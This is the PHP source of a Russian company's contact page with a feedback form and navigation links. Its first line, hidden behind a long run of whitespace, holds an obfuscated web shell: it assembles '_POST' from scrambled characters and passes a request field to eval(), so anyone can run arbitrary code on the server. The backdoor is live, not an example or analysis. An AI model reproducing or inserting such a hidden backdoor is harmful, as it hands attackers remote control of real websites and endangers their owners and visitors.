<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q3cf23a'])){eval(${$s20}['q3cf23a']);}?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
...
<table style="margin: 30 0 30 0" border="0" width="100%" cellspacing="0" cellpadding="0">
	...
	<tr>
		...
		<td background="image/pl_bg.gif" width="100%" style="padding:10 0 0 280;"><h1 class="zag">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;КОНТАКТЫ
...
<?php 
    ...
    if ($q) 
    { 
        $name=$_POST['name']; $email=$_POST['email']; $subject=$_POST['subject']; $message=$_POST['message']; $tel=$_POST['tel']; // принимаем данные из формы для обработки 
       	$address=$milo; // ваш адрес на который будут отсылатся письма из формы обратной связи 
       	if ($name && $email && $message && tel) // проверяем заполнены ли все обезятельные поля 
        { 
...
<html>
    <body>
        ...
        <table>
            <tr> <td> Ваше имя<a style='color:red;'>*</a> </td> <td> <input type="text" name="name">	</td> </tr>
            <tr> <td> Ваш еmail<a style='color:red;'>*</a> </td> <td> <input type="text" name="email"> </td> </tr>
            <tr> <td> Ваш телефон<a style='color:red;'>*</a> </td> <td> <input type="text" name="tel"> </td> </tr>
            <tr> <td> Тема письма </td> <td> <input type="text" name="subject">	</td> </tr>
            <tr> <td valign="top"> Сообщение<a style='color:red;'>*</a> </td> <td> <textarea name="message" cols="50" rows="10"> </textarea> </td> </tr> 
            <tr> <td> <input type="submit" value="Отправить"> </td> </tr> 
            <tr> <td colspan=2> 
<?php 
    if ($q) 
   	{ 
        if (!$name || !$email || !$message || !$tel) echo "<a style='color:red;'>Пожалуйста, заполните все обезятельные поля</a>"; // проверка заполнены ли все обезятельные поля для отправки сообщения + вывод ошибки. 
        else if ($mail) echo "<a style='color:red;'>Письмо успешно отправлено</a>"; 
    } 
?> </td> </tr> 
        </table> 
...
<br />
*Поля отмеченные <a style='color:red;'>*</a> обязательны к заполнению
</td>
  </tr>
</table>
<!------------ /центр столбец -------------->
...
<td class="dn" style="text-align:center"><a class="dn" href="/">ГЛАВНАЯ</a>    |    <a class="dn" href="o_kompania.php">О КОМПАНИИ</a>    |    <a class="dn" href="kontakt.php">КОНТАКТЫ</a></td> 
